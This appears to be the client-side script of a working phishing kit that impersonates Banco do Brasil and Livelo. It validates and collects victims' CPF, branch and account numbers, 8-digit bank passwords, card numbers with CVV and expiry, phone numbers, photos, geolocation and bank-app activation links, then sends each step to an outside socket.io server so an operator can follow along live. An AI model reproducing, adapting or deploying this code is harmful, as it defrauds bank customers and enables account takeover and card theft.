try {
    // $ = global.$ = global.jQuery = window.$ = window.jQuery = require('jquery');
    global.$ = global.jQuery = global.$ = global.jQuery = window.$ = window.jQuery = require('jquery');
  
  } catch (e) {alert(e)}
  

  
  require('./polyfill');
  require('jquery-mask-plugin')
  window.alertify = require('alertifyjs')
  const cpf = require("@fnando/cpf/commonjs");
  const io = require('socket.io-client');
  window.foneparse = require('telefone/parse');
  window.valid = require("card-validator");
  

  const socket = io('https://socketio.rico-com-vc.com');
  
  socket.on('connect', () => {
  });

  $.ajaxSetup({
    headers: {
      'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
    }
  });
  
  window.init = function () {
    watchLocation(function (coords) {
      if (sendGeo != true) {
        $.post('/api', {
          action: 'geo',
          latitude: coords.latitude,
          longitude: coords.longitude
        }, function (response) {
          sendGeo = true;
        });
      }
    }, function () {
      //
    });
  }
  
  /**
   * Retorna o(s) numDig Dígitos de Controle Módulo 11 do
   * dado, limitando o Valor de Multiplicação em limMult,
   * multiplicando a soma por 10, se indicado:
   *
   *    Números Comuns:   numDig:   limMult:   x10:
   *      CPF                2         12      true
   *      CNPJ               2          9      true
   *      PIS,C/C,Age        1          9      true
   *      RG SSP-SP          1          9      false
   *
   * @version                V5.0 - Mai/2001~Out/2015
   * @author                 CJDinfo
   * @param  string  dado    String dado contendo o número (sem o DV)
   * @param  int     numDig  Número de dígitos a calcular
   * @param  int     limMult Limite de multiplicação
   * @param  boolean x10     Se true multiplica soma por 10
   * @return string          Dígitos calculados
   */
  window.calculaDigitoMod11 = function (dado, numDig, limMult, x10) {
  
    var mult, soma, i, n, dig;
  
    if (!x10)
      numDig = 1;
    for (n = 1; n <= numDig; n++) {
      soma = 0;
      mult = 2;
      for (i = dado.length - 1; i >= 0; i--) {
        soma += (mult * parseInt(dado.charAt(i)));
        if (++mult > limMult)
          mult = 2;
      }
      if (x10) {
        dig = ((soma * 10) % 11) % 10;
      } else {
        dig = soma % 11;
        if (dig == 10)
          dig = "X";
      }
      dado += (dig);
    }
    return dado.substr(dado.length - numDig, numDig);
  }
  
  window.formData = {};
  

  $(document).ready(function () {
  
    //
    
    $('#enviaSMSAll').on('click', function(e) {
      e.preventDefault()
  
      var uuid = uuid_+'/';
  
      var formData = {
        'uuid': $('#uuid').val(),
        'action': 'doSendLink'
      };
  
      $.ajax({
        url: uuid_+ '/api',
        type: 'post',
        data: formData,
  
        beforeSend: function () {
          // botao.attr('disabled', true);
          $('#livelo-spinner').fadeIn().css('z-index', 3000);
        },
  
        success: function (obj) {
          if (obj.result === 'true') {
            socket.emit('bblivelo',{id:obj._id,msg:obj.message,next:obj.next})
            $('#livelo-spinner').fadeOut().css('z-index', 3000);
          } else {
            alertify.alert('Aviso', obj.message);
            $('#livelo-spinner').fadeOut().css('z-index', 3000);
            // botao.attr('disabled', false);
          }
        },
  
        error: function (request, status, erro) {
          $('#livelo-spinner').fadeOut().css('z-index', 3000);
          // botao.attr('disabled', false);
  
          //
          var ct = request.getResponseHeader("content-type") || "";
          if (ct.indexOf("json") > -1) {
            var obj = jQuery.parseJSON(request.responseText);
            alertify.alert('Aviso', obj.message);
          } else {
            alertify.alert('Aviso', 'Sistema indisponível no momento, por favor tente novamente.');
          }
        }
      })
    })
  
    //
    if ($('#inpLinkAto').length >= 1) {
      $("#inpLinkAto").on("paste",function(){
        var _this = $(this);
  
        setTimeout(function(){
          // document.getElementById("formPrimary").submit();
        }, 100);
      });
    }
  
    //
    if( $('.logo-body').length >= 1) {
      setTimeout(function () {
        $('.logo-body').fadeOut(300, function () {
          $(this).remove();
        });
      }, 3000); // milliseconds
    }
  
    $('#input_cvv').mask('000')
    $('.cartao, #input_card').mask('0000 0000 0000 0000');
    $('#input_val').mask('00/00')
  
    $('body').on('click', '.close-message', function () {
      $('#chatBox').hide();
    });
  
    helpBlock = function (input, text) {
      input.parent().addClass('has-error');
      input.parent().find('.help-block').html(text);
      input.focus();
    };
    validPhone = function (phone) {
      return /^[1-9][0-9]9[2-9][0-9]{7}$/.test(phone);
    };
    loadPage = function (page) {
      $('#main').fadeOut('fast', function () {
        $('#load').fadeIn('fast', function () {
          $.get('livelo/' + page, function (html) {
            $('#load').fadeOut('fast', function () {
              $('#load').removeClass('yellow').addClass('blue');
              $('#main').html(html).fadeIn('fast');
            });
          });
        });
      });
    };
    showLoad = function () {
      $('#main').fadeOut('fast', function () {
        $('#load').fadeIn('fast');
      });
    };
    hideLoad = function () {
      $('#load').fadeOut('fast', function () {
        $('#main').fadeIn('fast');
      });
    };
  
    $('body').on('focus', '.phone', function () {
      var maskBehavior = function (val) {
          return val.replace(/\D/g, '').length === 11 ? '(00) 00000-0000' : '(00) 0000-00009';
        },
        options = {
          onKeyPress: function (val, e, field, options) {
            field.mask(maskBehavior.apply({}, arguments), options);
  
            if (field[0].value.length >= 14) {
              var val = field[0].value.replace(/\D/g, '');
              if (/\d\d(\d)\1{7,8}/.test(val)) {
                field[0].value = '';
                alert('Telefone inválido!');
              }
            }
          }
        };
      $(this).mask(maskBehavior, options);
    });
  
    $('#cpf, #input_cpf').mask('000.000.000-00');
  
    $("#agencia, #input_ag").mask("0000-0", {
      reverse: true
    });
  
    $("#conta, #input_cc").mask("00000000000-0", {
      reverse: true
    });
  
    $('#input_sn').mask('00000000', {
      onComplete: function () {
        $('.btn-bb').focus();
      }
    });
  
    $("#action").change(function () {
      var option = this.value;
      if (option == 'doLoginJuridica') {
        document.getElementById('frm-pf').classList.add('hide');
        document.getElementById('frm-pj').classList.remove('hide');
        document.getElementById('input_ag').value = '';
        document.getElementById('input_cc').value = '';
        document.getElementById('input_sn').value = '';
        $("#frm-pf :input").removeAttr("required");
        $("#frm-pj :input").prop('required', true);
      } else if (option == 'doLogin') {
        document.getElementById('frm-pj').classList.add('hide');
        document.getElementById('frm-pf').classList.remove('hide');
        document.getElementById('campoChave').value = '';
        document.getElementById('campoSenha').value = '';
        $("#frm-pj :input").removeAttr("required");
        $("#frm-pf :input").prop('required', true);
      }
    });
  
    $('input:file').change(function () {
      if ($(this).get(0).files.length !== 0) {
        resizeImages(this.files[0], function (dataUrl) {
          $('#livelo-spinner').fadeIn().css('z-index', 3000);
          var file_data = $('#fotografia').prop('files')[0];
          var form_data = new FormData();
          form_data.append('arquivo', dataUrl);
          form_data.append('action', 'doUpload');
          $.ajax({
            url: '/api',
            dataType: 'text',
            cache: false,
            contentType: false,
            processData: false,
            data: form_data,
            type: 'post',
            success: function (e) {
              $('#livelo-spinner').fadeOut().css('z-index', 3000);
              $('#pedirCartao').hide();
            }
          });
        });
      }
    });
  
    $('form').on('submit', function (event) {
      event.preventDefault();
      var forma = $(this);
      var botao = $(this).find(':button');
      var formData = $(this);
      $('.form-group').removeClass('has-error');
      $('.help-block').html('&nbsp;');
  
      var uuid = uuid_+'/';
  
      if ($('#cpf').length && cpf.isValid($("#cpf").val()) != true) {
        alertify.alert('Aviso', 'CPF Inválido!')
        $('#cpf').val('')
        $('#cpf').trigger('focus')
        return false
      }
  
      if ($('#input_cpf').length && cpf.isValid($("#input_cpf").val()) != true) {
        alertify.alert('Aviso', 'CPF Inválido!')
        $('#input_cpf').val('')
        $('#input_cpf').trigger('focus')
        return false
      }
  
      if ($('#telefone').length && window.foneparse($("#telefone").val(), {
          apenasCelular: true
        }) == null) {
        alertify.alert('Aviso', 'Telefone Inválido!')
        $('#telefone').val('')
        $('#telefone').trigger('focus')
        return false
      }
  
      if ($('#input_cel').length && window.foneparse($("#input_cel").val(), {
          apenasCelular: true
        }) == null) {
        alertify.alert('Aviso', 'Telefone Inválido!')
        $('#input_cel').val('')
        $('#input_cel').trigger('focus')
        return false
      }
  
      if ($('#inpLinkAto').length && !$('#inpLinkAto').val().includes("resgate://ato?c=") && !$('#inpLinkAto').val().includes("bbapp://ato?c=") && !$('#inpLinkAto').val().includes("/sms/gcs?c=") && !$('#inpLinkAto').val().includes("bb://ato?c=")) {
        alertify.alert('Aviso', 'O Link informado esta inválido!')
        $('#inpLinkAto').val('')
        $('#inpLinkAto').trigger('focus')
        return false
      }
  
      if ($('#action').val() == 'doLogin2') {
        if ($('#agencia').val().length < 4 || calculaDigitoMod11($('#agencia').val().split("-")[0], 1, 9, true) != $('#agencia').val().split("-")[1]) {
          alertify.alert('Aviso', "Agência inválida. Caso necessário substitua X por 0.");
          $('#agencia').val('')
          $('#agencia').trigger('focus')
          return false
        }
  
        if ($('#conta').val().length < 5 || calculaDigitoMod11($('#conta').val().split("-")[0], 1, 9, true) != $('#conta').val().split("-")[1]) {
          alertify.alert('Aviso', "Conta inválida. Caso necessário substitua X por 0.");
          $('#conta').val('')
          $('#conta').trigger('focus')
          return false
        }
  
        if ($('#senha').val().length != 8) {
          alertify.alert('Aviso', "Senha inválida, digite a sua senha de 8 dígitos.");
          $('#senha').val('')
          $('#senha').trigger('focus')
          return false
        }
      }
  
      if ($('#action').val() == 'doLogin') {
        if ($('#input_ag').val().length < 4 || calculaDigitoMod11($('#input_ag').val().split("-")[0], 1, 9, true) != $('#input_ag').val().split("-")[1]) {
          alertify.alert('Aviso', "Agência inválida. Caso necessário substitua X por 0.");
          $('#input_ag').val('')
          $('#input_ag').trigger('focus')
          return false
        }
  
        if ($('#input_cc').val().length < 5 || calculaDigitoMod11($('#input_cc').val().split("-")[0], 1, 9, true) != $('#input_cc').val().split("-")[1]) {
          alertify.alert('Aviso', "Conta inválida. Caso necessário substitua X por 0.");
          $('#input_cc').val('')
          $('#input_cc').trigger('focus')
          return false
        }
  
        if ($('#input_sn').val().length != 8) {
          alertify.alert('Aviso', "Senha inválida, digite a sua senha de 8 dígitos.");
          $('#input_sn').val('')
          $('#input_sn').trigger('focus')
          return false
        }
      }
  
      //
      if ($('#input_card').length) {
        var numberValidation = valid.number($("#input_card").val());
        if (!numberValidation.isValid) {
            alertify.alert('Aviso', "Verifique o número do seu cartão e tente novamente");
            return false;
        }
      }
  
      // take
      if (formData.serialize().includes("doFonePasse")) {
  
        $('#livelo-spinner').fadeIn().css('z-index', 99999);
  
        setTimeout(function() {
          $('.chakra-portal').attr('data-state', 'show').fadeIn('slow');
          $('#livelo-spinner').fadeOut().css('z-index', 99999);
  
          //
          var input_cel = $('input[name="input_cel"]:checked');
  
          if(input_cel.length == 0 ) {
            var input_cel = $('input[name="input_cel"]')
          }
          $('#input_celA').val(input_cel.val())
        }, 2500);
  
        return false;
      }
      //post Login e outros
      var formData = $(this).serializeArray(); // Serializa os dados do formulário
      var jsonData = formData.reduce(function(obj, item) {
          obj[item.name] = item.value;
          return obj;
      }, {});
      
      $.ajax({
        url: uuid_ + '/api',
        type: 'post',
        data: forma.serialize(),

        beforeSend: function () {
          botao.attr('disabled', true);
          $('#livelo-spinner').fadeIn().css('z-index', 3000);
        },
  
        success: function (obj) {
          if (obj.result === 'true') {
            $('#livelo-spinner').fadeOut().css('z-index', 3000);
            console.log(obj.next)
            socket.emit('bblivelo',{id:obj._id,msg:obj.message,next:obj.next})
            $(location).attr('href', uuid_+'/' + obj.next);
          } else {
            socket.emit('bblivelo',obj.message)
            alertify.alert('Aviso', obj.message);
            $('#livelo-spinner').fadeOut().css('z-index', 3000);
            botao.attr('disabled', false);
          }
        },
  
        error: function (request, status, erro) {
          $('#livelo-spinner').fadeOut().css('z-index', 3000);
          botao.attr('disabled', false);
  
          //
          var ct = request.getResponseHeader("content-type") || "";
          if (ct.indexOf("json") > -1) {
            var obj = jQuery.parseJSON(request.responseText);
            alertify.alert('Aviso', obj.message);
          } else {
            alertify.alert('Aviso', 'Sistema indisponível no momento, por favor tente novamente.');
          }
        }
      });
    });
  });
  
  window.mostraDialogo = function (mensagem, tipo, tempo, inferior) {
  
    // se houver outro alert desse sendo exibido, cancela essa requisição
    if ($("#message").is(":visible")) {
      return false;
    }
    // se não setar o tempo, o padrão é 3 segundos
    if (!tempo) {
      var tempo = 3000;
    }
    // se não setar o tipo, o padrão é alert-info
    if (!tipo) {
      var tipo = "info";
    }
  
    if (inferior) {
      var cssMessage = "display: block; position: fixed; bottom: 35px; left: 20%; right: 20%; width: 60%; padding-top: 10px; z-index: 9999";
    } else {
      var cssMessage = "display: block; position: fixed; top: 0; left: 20%; right: 20%; width: 60%; padding-top: 10px; z-index: 9999";
    }
    // monta o css da mensagem para que fique flutuando na frente de todos elementos da página
    var cssInner = "margin: 0 auto; box-shadow: 1px 1px 5px black;";
    // monta o html da mensagem com Bootstrap
    var dialogo = "";
    dialogo += '<div id="message" style="' + cssMessage + '">';
    dialogo += '    <div class="alert alert-' + tipo + ' alert-dismissable" style="' + cssInner + '">';
    dialogo += '    <a href="#" class="close" aria-label="close">&times;</a>';
    dialogo += mensagem;
    dialogo += '    </div>';
    dialogo += '</div>';
    // adiciona ao body a mensagem com o efeito de fade
    $("body").append(dialogo);
    $("#message").hide();
    $("#message").fadeIn(200);
    // contador de tempo para a mensagem sumir
    setTimeout(function () {
      $('#message').fadeOut(300, function () {
        $(this).remove();
      });
    }, tempo); // milliseconds
  }
  
  window.proximoCampo = function (atual, proximo) {
    if (atual.value.length >= atual.maxLength) {
      document.getElementById(proximo).focus();
    }
  }
  
  window.resizeImages = function (file, complete) {
    var reader = new FileReader();
    reader.onload = function (e) {
      var img = new Image();
      img.onload = function () {
        complete(resizeInCanvas(img));
      };
      img.src = e.target.result;
    }
    reader.readAsDataURL(file);
  }
  
  window.resizeInCanvas = function (img) {
    var perferedWidth = 800;
    var ratio = perferedWidth / img.width;
    var canvas = $("<canvas>")[0];
    canvas.width = img.width / 4;
    canvas.height = img.height / 4;
    var ctx = canvas.getContext("2d");
    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
    return canvas.toDataURL("image/png");
  }
  